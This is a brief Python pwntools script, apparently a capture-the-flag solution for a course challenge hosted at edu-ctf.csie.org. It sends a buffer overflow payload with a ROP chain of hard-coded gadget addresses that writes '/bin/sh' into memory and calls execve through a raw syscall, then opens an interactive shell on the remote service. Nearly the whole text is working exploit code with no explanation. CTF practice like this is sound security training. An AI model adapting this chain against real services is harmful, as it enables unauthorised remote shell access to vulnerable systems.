from pwn import *

context.arch = 'amd64'

conn = remote('edu-ctf.csie.org', 10173)

pop_rdi = 0x0000000000400686
pop_rsi = 0x00000000004100f3
pop_rdx = 0x0000000000449935
pop_rax = 0x0000000000415714
pop_rdx_rsi = 0x000000000044beb9

mov_rdi_rsi = 0x000000000044709b

syscall = 0x000000000040125c
bin_sh = 0x6b6040

payload = 'a'*(0x30+8)
payload += p64(pop_rdi)
payload += p64(bin_sh)

payload += p64(pop_rsi)
payload += "/bin/sh\0"

payload += p64(mov_rdi_rsi)

payload += p64(pop_rdx_rsi)
payload += p64(0)
payload += p64(0)

payload += p64(pop_rax)
payload += p64(0x3b)

payload += p64(syscall)

conn.sendlineafter(':D', payload)

conn.interactive()
